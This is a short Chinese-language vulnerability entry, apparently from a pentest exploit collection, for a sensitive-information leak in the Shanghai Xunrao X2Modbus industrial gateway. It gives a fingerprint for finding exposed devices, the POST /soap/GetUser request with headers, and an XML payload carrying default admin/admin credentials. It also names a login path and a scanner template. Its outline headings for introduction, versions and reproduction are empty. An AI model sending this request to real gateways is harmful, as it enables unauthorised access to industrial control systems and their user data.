# 上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露

- **系统**：上海迅饶自动化科技有限公司X2Modbus网关　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`server="SunFull-Webs"`
- **请求**：`POST /soap/GetUser HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 56`

**请求体 / payload**
```
<GetUser><User Name="admin" Password="admin"/></GetUser>

登录入口
/login.html

\[X2Modbus-getuser-info.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 上海迅饶自动化科技有限公司X2Modbus网关GetUser存在敏感信息泄露: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * X2Modbus